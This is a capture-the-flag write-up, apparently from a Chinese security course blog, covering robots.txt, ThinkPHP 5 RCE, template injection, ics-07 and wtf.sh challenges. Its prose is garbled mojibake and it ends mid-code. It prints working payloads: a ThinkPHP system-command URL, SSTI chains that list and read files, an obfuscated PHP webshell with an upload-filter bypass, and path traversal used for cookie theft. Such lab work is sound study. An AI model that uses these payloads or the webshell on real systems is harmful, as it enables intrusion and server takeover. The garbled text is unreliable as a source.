    <content type="html"><![CDATA[<div class="note info flat"><p>æœ¬æ–‡æ˜¯ã€Šç½‘ç»œå®‰å…¨è¯¾ç¨‹è®¾è®¡ã€‹çš„ä¸€é¡¹ä»»åŠ¡</p></div><h2 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h2><p><strong>é¢˜ç›®æè¿°ï¼šXè€å¸ˆä¸Šè¯¾è®²äº†Robotsåè®®ï¼Œå°å®åŒå­¦å´ä¸Šè¯¾æ‰“äº†çŒç¡ï¼Œèµ¶ç´§æ¥æ•™æ•™å°å®Robotsåè®®æ˜¯ä»€ä¹ˆå§ã€‚</strong></p><p>robots.txtï¼ˆç»Ÿä¸€å°å†™ï¼‰æ˜¯ä¸€ç§å­˜æ”¾äºç½‘ç«™æ ¹ç›®å½•ä¸‹çš„ASCIIç¼–ç çš„æ–‡æœ¬æ–‡ä»¶ï¼Œrobots.txtåº”æ”¾ç½®äºç½‘ç«™çš„æ ¹ç›®å½•ä¸‹ã€‚å¦‚æœæƒ³å•ç‹¬å®šä¹‰æœç´¢å¼•æ“çš„æ¼«æ¸¸å™¨è®¿é—®å­ç›®å½•æ—¶çš„è¡Œä¸ºï¼Œé‚£ä¹ˆå¯ä»¥å°†è‡ªå®šçš„è®¾ç½®åˆå¹¶åˆ°æ ¹ç›®å½•ä¸‹çš„robots.txtï¼Œæˆ–è€…ä½¿ç”¨robotså…ƒæ•°æ®ï¼ˆMetadataï¼Œåˆç§°å…ƒæ•°æ®ï¼‰ã€‚</p><p>äºæ˜¯åº”è¯¥è¯»å–robots.txté‡Œçš„å†…å®¹ã€‚</p><p><img src="/img/df9f5f5e75986b677ce32396cffd8cc9.png"></p><p>ç›´æ¥è®¿é—®<a href="http://111.200.241.244:58484/f1ag_1s_h3re.php%E5%BE%97%E5%88%B0flag%E3%80%82">http://111.200.241.244:58484/f1ag_1s_h3re.phpå¾—åˆ°flagã€‚</a></p><h2 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h2><p><img src="/img/b2bd1f216d60ddfe07f4ace3182afe2c.png"></p><p>ç”±é¢˜ç›®åç§°å¯å¾—çŸ¥æœ¬é¢˜ä¸robotsåè®®æœ‰å…³ï¼Œäºæ˜¯æ£€æŸ¥è¯¥ç«™ç‚¹æœ‰æ²¡æœ‰robots.txtæ–‡ä»¶ï¼šDisallow:<br>/fl0g.phpè¡¨ç¤ºç½‘ç«™ç¦æ­¢èœ˜è››è®¿é—®æœ¬ç›®å½•ï¼Œäºæ˜¯æˆ‘ä»¬å°è¯•è®¿é—®<a href="http://111.200.241.244:63486/fl0g.php">http://111.200.241.244:63486/fl0g.php</a>ï¼Œå¾—åˆ°flagã€‚<img src="/img/0ccb5d59c2010734adb4c98539b534dc.png"></p><h2 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h2><p>ç”±é¢˜æ„å¾—æœ¬é¢˜åº”è¯¥ä¸ThinkPHP V5è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ç›¸å…³ã€‚åœ¨Githubä¸Šæœç´¢ç›¸å…³å†…å®¹ï¼š</p><p><img src="/img/4fd2ab7182703b25198994e81a425125.png"></p><p>åœ¨ç½‘é¡µä¸­éšæ„æ‰“å¼€ä¸€ä¸ªæ— æ•ˆç½‘å€ï¼Œå¾—åˆ°æŠ¥é”™æç¤ºï¼š</p><p><img src="/img/a9cca3ac9c5022816ae10322324a7b66.png">ç”±æ­¤æˆ‘ä»¬å¯ä»¥å¾—åˆ°ç‰ˆæœ¬å·ä¸ºThinkPHP V5.0.20ã€‚åœ¨ç›¸å…³æ¼æ´ä¸­æ£€ç´¢ï¼Œé¦–å…ˆå°è¯•<code>http://111.200.241.244:60671/?s=index/\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</code>ï¼Œå¯ä»¥å‘ç°è¿œç¨‹ä»£ç æ‰§è¡ŒæˆåŠŸï¼š</p><p><img src="/img/326a10e0e05a53ff0c372081a203431c.png">äºæ˜¯å°†idæ¢ä¸ºlsä»¥æŸ¥æ‰¾ç›®å½•ï¼Œä¸æ–­è¿›å…¥ä¸Šå±‚ç›®å½•å‘ç°flagæ–‡ä»¶ï¼š</p><p><img src="/img/c80c7f3d4d4d0ac99695d0d2ad79e1d0.png"></p><p>äºæ˜¯ç›´æ¥åˆ©ç”¨catå‘½ä»¤æ‰“å¼€/flagç›®å½•ï¼Œå¾—åˆ°flagã€‚</p><p><img src="/img/8f829e80fed6ebefee5ca0e3339f5ef8.png"></p><h2 id="Web-python-template-injection"><a href="#Web-python-template-injection" class="headerlink" title="Web_python_template_injection"></a>Web_python_template_injection</h2><p>ç”±é¢˜æ„å¯å¾—æœ¬é¢˜åˆ©ç”¨äº†Python-æ¨¡æ¿æ³¨å…¥æ¼æ´ã€‚åœ¨å½“å‰URLåé¢æ·»åŠ <code>&#123;&#123;[].class&#125;&#125;</code>å¯ä»¥å¾—åˆ°å¦‚ä¸‹ç»“æœï¼Œè¯´æ˜ä»£ç æ³¨å…¥æˆåŠŸï¼Œç½‘ç«™å·²ç»æ‰§è¡Œäº†æˆ‘ä»¬çš„ä»£ç ã€‚<img src="/img/e3e0d499e72c09732cf4a4134a10d736.png"></p><p>äºæ˜¯ä¾¿å¯ä»¥åˆ©ç”¨pythonçš„osæ¨¡å—çš„<code>listdir()</code>å‡½æ•°æ¥è¯»å–å½“å‰ç›®å½•ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].listdir(<span class="string">&#x27;.&#x27;</span>)  <span class="comment">#è¯»å–å½“å‰ç›®å½•</span></span><br></pre></td></tr></table></figure><p>æ³¨å…¥ä»£ç åå¾—åˆ°ï¼š</p><p><img src="/img/469510da576d41cbe50d3e331c6a38fe.png"></p><p>å‘ç°å½“å‰ç›®å½•ä¸­æœ‰fl4gæ–‡ä»¶ï¼Œäºæ˜¯å°è¯•æ‰“å¼€è¯¥æ–‡ä»¶ã€‚ä½¿ç”¨Pythonä¸­fileæ¨¡å—çš„<code>read()</code>å‡½æ•°è¯»å–æ–‡ä»¶ï¼Œå¹¶å¾—åˆ°flagå€¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;fl4g&#x27;</span>).read()</span><br></pre></td></tr></table></figure><p><img src="/img/fa75c00e91a77618bff21a57442ebc8f.png"></p><div class="note warning flat"><p>ä¸‹æ–‡çš„â€œéš¾åº¦â€æŒ‡æ”»é˜²ä¸–ç•Œçš„é¢˜ç›®æ˜Ÿçº§ï¼Œæœ€é«˜ä¸º10æ˜Ÿ</p></div><h2 id="ics-07-ï¼ˆéš¾åº¦ï¼š5-10ï¼‰"><a href="#ics-07-ï¼ˆéš¾åº¦ï¼š5-10ï¼‰" class="headerlink" title="ics-07 ï¼ˆéš¾åº¦ï¼š5/10ï¼‰"></a>ics-07 ï¼ˆéš¾åº¦ï¼š5/10ï¼‰</h2><p>è¿›å…¥ä¸»é¡µåå‘ç°å·¦ä¾§èœå•æ å’Œå³ä¾§ä¸€å¼ å›¾ç‰‡ï¼Œä½†èœå•æ åªæœ‰â€œé¡¹ç›®ç®¡ç†â€æŒ‰é’®æœ‰ä½œç”¨ï¼š</p><p><img src="/img/8e6eb9efc070cfff3e42cc8d54fb82b7.png"></p><p>è¿›å…¥åæœ‰ä¸€ä¸ªç™»å½•ç•Œé¢å’Œæºä»£ç æŸ¥çœ‹æŒ‰é’®ï¼š</p><p><img src="/img/311ea86d8680347f7c15d4b5ff668f69.png"></p><p>æŸ¥çœ‹æºä»£ç è¿›è¡Œä»£ç å®¡è®¡ã€‚</p><p>é¦–å…ˆä»”ç»†é˜…è¯»ç¬¬ä¸€æ®µä»£ç ï¼Œå¦‚æœpageä¸ä¸ºç©ºä¸”ä¸ç­‰äº<code>index.php</code>ï¼Œé‚£ä¹ˆå°±ä¼šæ‰§è¡Œ<code>include(&#39;flag.php&#39;);</code>å¦åˆ™ä¼šé‡å®šå‘åˆ°<code>flag.php</code>æ–‡ä»¶ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Â Â Â Â session_start();</span><br><span class="line">Â Â Â Â <span class="keyword">if</span>Â (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[page]))Â &#123;</span><br><span class="line">Â Â Â Â Â Â show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">Â Â Â Â Â Â <span class="keyword">die</span>();</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line"></span><br><span class="line">Â Â Â Â <span class="keyword">if</span>Â (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[page])Â &amp;&amp;Â <span class="variable">$_GET</span>[page]Â !=Â <span class="string">&#x27;index.php&#x27;</span>)Â &#123;</span><br><span class="line">Â Â Â Â Â Â <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">Â Â Â Â &#125;<span class="keyword">else</span>Â &#123;</span><br><span class="line">Â Â Â Â Â Â header(<span class="string">&#x27;Location:Â ?page=flag.php&#x27;</span>);</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç¬¬äºŒæ®µä»£ç ç”¨æ¥è¿›è¡Œç”¨æˆ·èº«ä»½é‰´åˆ«ï¼Œåˆ¤æ–­sessionæ˜¯ä¸æ˜¯adminï¼Œå¹¶è·å–å€¼æ¥åŒ¹é…<code>ph(p[3457]?\|t\|tml)</code>ï¼Œå¦‚æœåŒ¹é…æˆåŠŸï¼ˆå³<code>php3457</code>,<code>pht</code>,<code>phtml</code>ï¼‰ï¼Œè¾“å‡ºâ€<code>Bad file extension</code>â€œï¼Œå¹¶é€€å‡ºï¼›å¦åˆ™å†™å…¥æ–‡ä»¶ã€‚å®é™…ä¸Šè¿™æ®µä»£ç æ˜¯å¯¹phpæ–‡ä»¶è¿›è¡Œè¿‡æ»¤ï¼Œæ£€éªŒæˆåŠŸåæ–‡ä»¶ä¸Šä¼ åˆ°<code>/uploaded/backup/</code>çš„ç›®å½•ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Â Â Â Â Â <span class="keyword">if</span>Â (<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>])Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â <span class="variable">$conÂ </span>=Â <span class="variable">$_POST</span>[<span class="string">&#x27;con&#x27;</span>];</span><br><span class="line">Â Â Â Â Â Â Â <span class="variable">$fileÂ </span>=Â <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">Â Â Â Â Â Â Â <span class="variable">$filenameÂ </span>=Â <span class="string">&quot;backup/&quot;</span>.<span class="variable">$file</span>;</span><br><span class="line">Â Â Â Â Â Â Â <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/.+\.ph(p[3457]?|t|tml)$/i&#x27;</span>,Â <span class="variable">$filename</span>))&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â <span class="keyword">die</span>(<span class="string">&quot;BadÂ fileÂ extension&quot;</span>);</span><br><span class="line">Â Â Â Â Â Â Â &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â chdir(<span class="string">&#x27;uploaded&#x27;</span>);</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â <span class="variable">$fÂ </span>=Â fopen(<span class="variable">$filename</span>,Â <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â fwrite(<span class="variable">$f</span>,Â <span class="variable">$con</span>);</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â fclose(<span class="variable">$f</span>);</span><br><span class="line">Â Â Â Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â Â <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰æ®µä»£ç æ˜¯å¯¹<code>get</code>å‚æ•°<code>id</code>è¿›è¡Œæ ¡éªŒï¼Œå¦‚æœidçš„æµ®ç‚¹æ•°ä¸æ˜¯1ï¼Œä¸”æœ€åä¸€ä½æ˜¯9é‚£ä¹ˆå®è¡ŒæŸ¥è¯¢è¯­å¥ï¼Œå¦‚æœæŸ¥è¯¢æ­£ç¡®ï¼Œä¼šå¾—åˆ°ä¸€ä¸ªadminçš„sessionã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Â Â Â Â Â Â <span class="keyword">if</span>Â (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[id])Â &amp;&amp;Â floatval(<span class="variable">$_GET</span>[id])Â !==Â <span class="string">&#x27;1&#x27;</span>Â &amp;&amp;Â substr(<span class="variable">$_GET</span>[id],Â -<span class="number">1</span>)Â ===Â <span class="string">&#x27;9&#x27;</span>)Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">include</span>Â <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="variable">$idÂ </span>=Â mysql_real_escape_string(<span class="variable">$_GET</span>[id]);</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="variable">$sql</span>=<span class="string">&quot;selectÂ *Â fromÂ cetc007.userÂ whereÂ id=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="variable">$resultÂ </span>=Â mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="variable">$resultÂ </span>=Â mysql_fetch_object(<span class="variable">$result</span>);</span><br><span class="line">Â Â Â Â Â Â &#125;Â <span class="keyword">else</span>Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="variable">$resultÂ </span>=Â <span class="literal">False</span>;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">die</span>();</span><br><span class="line">Â Â Â Â Â Â &#125;</span><br><span class="line"></span><br><span class="line">Â Â Â Â Â Â <span class="keyword">if</span>(!<span class="variable">$result</span>)<span class="keyword">die</span>(<span class="string">&quot;&lt;brÂ &gt;somethingÂ waeÂ wrongÂ !Â &lt;br&gt;&quot;</span>);</span><br><span class="line">Â Â Â Â Â Â <span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â <span class="string">&quot;id:Â &quot;</span>.<span class="variable">$result</span>-&gt;id.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â <span class="string">&quot;name:&quot;</span>.<span class="variable">$result</span>-&gt;user.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>]Â =Â <span class="literal">True</span>;</span><br><span class="line">Â Â Â Â Â Â &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬ç›´æ¥æ„é€ æ»¡è¶³æ‰€æœ‰è¦æ±‚çš„payloadï¼š<code>?id=1a9&amp;page=flag.php</code>ï¼ŒæˆåŠŸç»•è¿‡ã€‚</p><p><img src="/img/raoguo.png"></p><p>ä¸‹é¢æˆ‘ä»¬å¼€å§‹å°è¯•æ–‡ä»¶ä¸Šä¼ ã€‚ç”±ç¬¬äºŒæ®µå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬åªèƒ½ç”¨POSTçš„æ–¹å¼ä¸Šä¼ æ–‡ä»¶ï¼Œå‚æ•°<code>con</code>æ˜¯æ–‡ä»¶å†…å®¹ï¼Œå‚æ•°<code>file</code>æ˜¯æ–‡ä»¶åã€‚æˆ‘ä»¬ä½¿ç”¨ä¸­å›½èšå‰‘ç”Ÿæˆå¯†ç ä¸ºzzzçš„æœ¨é©¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$exRN</span>=create_function(str_rot13(<span class="string">&#x27;$&#x27;</span>).chr(<span class="number">0x307</span>-<span class="number">0x294</span>).chr(<span class="number">0155546</span>/<span class="number">0772</span>).str_rot13(<span class="string">&#x27;z&#x27;</span>).chr(<span class="number">01154</span>-<span class="number">01007</span>),chr(<span class="number">474</span>-<span class="number">373</span>).str_rot13(<span class="string">&#x27;i&#x27;</span>).base64_decode(<span class="string">&#x27;YQ==&#x27;</span>).base64_decode(<span class="string">&#x27;bA==&#x27;</span>).str_rot13(<span class="string">&#x27;(&#x27;</span>).chr(<span class="number">891</span>-<span class="number">855</span>).str_rot13(<span class="string">&#x27;f&#x27;</span>).chr(<span class="number">38628</span>/<span class="number">348</span>).str_rot13(<span class="string">&#x27;z&#x27;</span>).chr(<span class="number">54540</span>/<span class="number">540</span>).str_rot13(<span class="string">&#x27;)&#x27;</span>).str_rot13(<span class="string">&#x27;;&#x27;</span>));<span class="variable">$exRN</span>(base64_decode(<span class="string">&#x27;ODA5N&#x27;</span>.<span class="string">&#x27;jM5O0&#x27;</span>.<span class="string">&#x27;BldkF&#x27;</span>.<span class="string">&#x27;sKCRf&#x27;</span>.<span class="string">&#x27;&#x27;</span>.chr(<span class="number">0x325</span>-<span class="number">0x2d0</span>).chr(<span class="number">01116</span>-<span class="number">01011</span>).chr(<span class="number">01371</span>-<span class="number">01300</span>).base64_decode(<span class="string">&#x27;VA==&#x27;</span>).str_rot13(<span class="string">&#x27;I&#x27;</span>).<span class="string">&#x27;&#x27;</span>.<span class="string">&#x27;&#x27;</span>.chr(<span class="number">792</span>-<span class="number">722</span>).chr(<span class="number">0x650c</span>/<span class="number">0xdf</span>).base64_decode(<span class="string">&#x27;Ng==&#x27;</span>).chr(<span class="number">0x14b</span>-<span class="number">0xe6</span>).chr(<span class="number">0x2c5</span>-<span class="number">0x257</span>).<span class="string">&#x27;&#x27;</span>.<span class="string">&#x27;pdKTs&#x27;</span>.<span class="string">&#x27;yNDI4&#x27;</span>.<span class="string">&#x27;OTE3O&#x27;</span>.<span class="string">&#x27;w==&#x27;</span>.<span class="string">&#x27;&#x27;</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç”±ç¬¬äºŒæ®µä»£ç æˆ‘ä»¬å¯ä»¥å‘ç°æ­£åˆ™åˆ¤æ–­.ä¹‹åçš„å­—ç¬¦ï¼Œäºæ˜¯æˆ‘ä»¬åŠ ä¸ª/.å³å¯è§£å†³ã€‚æ‰€ä»¥æˆ‘ä»¬postçš„payloadæ˜¯ï¼š</p><p><code>file=pa.php/.&amp;con=\&lt;?php \$exRNâ€¦â€¦;?\&gt;(çœç•¥å¤„è§å‰è¿°æœ¨é©¬)</code></p><p>æˆåŠŸè¿æ¥ä¸­å›½èšå‰‘</p><p><img src="/img/c2501ab2a9daeef01e31dd752a762928.png"></p><p>æ‰“å¼€/var/www/html/flag.phpï¼Œå¾—åˆ°flagã€‚</p><p><img src="/img/e8d57c85d1a0679662431fc3f3f84ebe.png"></p><h2 id="wtf-sh-150-ï¼ˆéš¾åº¦ï¼š7-10ï¼‰"><a href="#wtf-sh-150-ï¼ˆéš¾åº¦ï¼š7-10ï¼‰" class="headerlink" title="wtf.sh-150 ï¼ˆéš¾åº¦ï¼š7/10ï¼‰"></a>wtf.sh-150 ï¼ˆéš¾åº¦ï¼š7/10ï¼‰</h2><p>è¿›å…¥ç½‘ç«™åéšä¾¿æ‰“å¼€ä¸€ç¯‡æ–‡ç« ï¼Œæ³¨æ„è§‚å¯ŸURL:</p><p><img src="/img/f22d356b05304e1feeed8ac13419de94.png"></p><p>æ³¨æ„åˆ°å¯èƒ½æœ‰è·¯å¾„ç©¿è¶Šæ¼æ´ï¼Œäºæ˜¯å°è¯•æ„é€ URLä¸º<a href="http://111.200.241.244:55069/post.wtf?post=..%E5%BE%97%E5%88%B0%E7%BD%91%E7%AB%99%E6%BA%90%E4%BB%A3%E7%A0%81%EF%BC%9A">http://111.200.241.244:55069/post.wtf?post=..å¾—åˆ°ç½‘ç«™æºä»£ç ï¼š</a></p><p><img src="/img/b60f653a2b7edfaae6474c9946368d39.png"></p><p>ç›´æ¥Ctrl+Fæœç´¢â€œflagâ€å…³é”®è¯ï¼š</p><p><img src="/img/981b4430ec7ddfa32cc3893aed8b1e90.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">Â Â Â Â <span class="tag">&lt;<span class="name">link</span>Â <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>Â <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>Â <span class="attr">href</span>=<span class="string">&quot;/css/std.css&quot;</span>Â &gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">$Â ifÂ containsÂ &#x27;user&#x27;Â $&#123;!URL_PARAMS[@]&#125;Â &amp;&amp;Â file_existsÂ &quot;users/$&#123;URL_PARAMS[&#x27;user&#x27;]&#125;&quot;</span><br><span class="line">$Â then</span><br><span class="line">$Â Â Â localÂ username=$(headÂ -nÂ 1Â users/$&#123;URL_PARAMS[&#x27;user&#x27;]&#125;);</span><br><span class="line">$Â Â Â echoÂ &quot;<span class="tag">&lt;<span class="name">h3</span>&gt;</span>$&#123;username&#125;&#x27;sÂ posts:<span class="tag">&lt;/<span class="name">h3</span>&gt;</span>&quot;;</span><br><span class="line">$Â Â Â echoÂ &quot;<span class="tag">&lt;<span class="name">ol</span>&gt;</span>&quot;;</span><br><span class="line">$Â Â Â get_users_postsÂ &quot;$&#123;username&#125;&quot;Â |Â whileÂ readÂ -rÂ post;Â do</span><br><span class="line">$Â Â Â Â Â Â Â post_slug=$(awkÂ -F/Â &#x27;&#123;printÂ $2Â &quot;#&quot;Â $3&#125;&#x27;Â &lt;&lt;&lt;Â &quot;$&#123;post&#125;&quot;);</span><br><span class="line">$Â Â Â Â Â Â Â echoÂ &quot;<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span>Â <span class="attr">href</span>=<span class="string">\</span>&quot;/<span class="attr">post.wtf</span>?<span class="attr">post</span>=<span class="string">$&#123;post_slug&#125;\</span>&quot;&gt;</span>$(nth_lineÂ 2Â &quot;$&#123;post&#125;&quot;Â |Â htmlentities)<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>&quot;;</span><br><span class="line">$Â Â Â doneÂ </span><br><span class="line">$Â Â Â echoÂ &quot;<span class="tag">&lt;/<span class="name">ol</span>&gt;</span>&quot;;</span><br><span class="line">$Â Â Â ifÂ is_logged_inÂ &amp;&amp;Â [[Â &quot;$&#123;COOKIES[&#x27;USERNAME&#x27;]&#125;&quot;Â =Â &#x27;admin&#x27;Â ]]Â &amp;&amp;Â [[Â $&#123;username&#125;Â =Â &#x27;admin&#x27;Â ]]</span><br><span class="line">$Â Â Â then</span><br><span class="line">$Â Â Â Â Â Â Â get_flag1</span><br><span class="line">$Â Â Â fi</span><br><span class="line">$Â fi</span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„ä¸Šé¢æ ‡å‡ºçš„ä»£ç ï¼Œä»ä¸­æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼šå½“COOKIESæ˜¯adminå¹¶ä¸”USERNAMEä¸ºadminæ—¶ï¼Œå¯ä»¥get_flag1ï¼Œäºæ˜¯ç¡®å®šäº†ä¹‹ååŠªåŠ›çš„æ–¹å‘æ˜¯å¾—åˆ°adminçš„COOKIEå€¼ï¼›ä»ä¸Šé¢çš„ä»£ç ä¸­æˆ‘ä»¬å¯ä»¥å‘ç°æœ‰/usersç›®å½•ï¼Œåˆ©ç”¨ä¹‹å‰çš„è·¯å¾„ç©¿è¶Šå°è¯•è¿›å…¥è¯¥ç›®å½•ï¼š</p><p><img src="/img/a1aa24e5ed4b944136edd15c9955de1a.png"></p><p>è¯¥ç›®å½•ç›´æ¥å­˜æ”¾ç€æ‰€æœ‰ç”¨æˆ·çš„cookieå€¼ï¼ŒåŒ…æ‹¬æˆ‘ä»¬ä¹‹å‰æ³¨å†Œçš„ç”¨æˆ·1å’Œadminã€‚å¯¹æ¯”ç™»å½•æ—¶çš„cookiesï¼š</p><p><img src="/img/cdcda0a57c0c36af0e8be0ccf64cef4f.png"></p><p>ç¡®å®šè¿™é‡Œå­˜æ”¾çš„å°±æ˜¯æ‰€æœ‰ç”¨æˆ·çš„tokenå€¼ã€‚æ‰€ä»¥æˆ‘ä»¬ç›´æ¥åˆ©ç”¨cookieæ¬ºéª—æ¥ç™»å½•adminè´¦æˆ·ã€‚</p><p><img src="/img/c027351dd95584b54913e0b6661e9b21.png"></p><p><img src="/img/d8d85966e880b584a945d89247dd3aa0.png"></p><p>å¾—åˆ°flagï¼Œä½†æ˜¾ç„¶flagä¸å®Œæ•´ï¼Œåªæ˜¯å‰åŠéƒ¨åˆ†ã€‚</p><p>ç»§ç»­è¿›è¡Œä»£ç å®¡è®¡ï¼Œå‘ç°<code>include_page</code>å‡½æ•°å­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>Â <span class="title">include_page</span>Â </span>&#123;</span><br><span class="line">Â Â Â Â <span class="comment">#Â include_pageÂ pathname</span></span><br><span class="line">Â Â Â Â localÂ pathname=$<span class="number">1</span></span><br><span class="line">Â Â Â Â localÂ cmd=</span><br><span class="line">Â Â Â Â [[Â $&#123;pathname(-<span class="number">4</span>)&#125;Â =Â <span class="string">&#x27;.wtf&#x27;</span>Â ]];</span><br><span class="line">Â Â Â Â localÂ can_execute=$;</span><br><span class="line">Â Â Â Â page_include_depth=$((<span class="variable">$page_include_depth</span>+<span class="number">1</span>))</span><br><span class="line">Â Â Â Â <span class="keyword">if</span>Â [[Â <span class="variable">$page_include_depthÂ </span>-ltÂ <span class="variable">$max_page_include_depthÂ </span>]]</span><br><span class="line">Â Â Â Â then</span><br><span class="line">Â Â Â Â Â Â Â Â localÂ line;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">while</span>Â readÂ -rÂ line;Â <span class="keyword">do</span></span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">#Â checkÂ ifÂ we&#x27;reÂ inÂ aÂ scriptÂ lineÂ orÂ notÂ ($Â atÂ theÂ beginningÂ impliesÂ scriptÂ line)</span></span><br><span class="line">Â 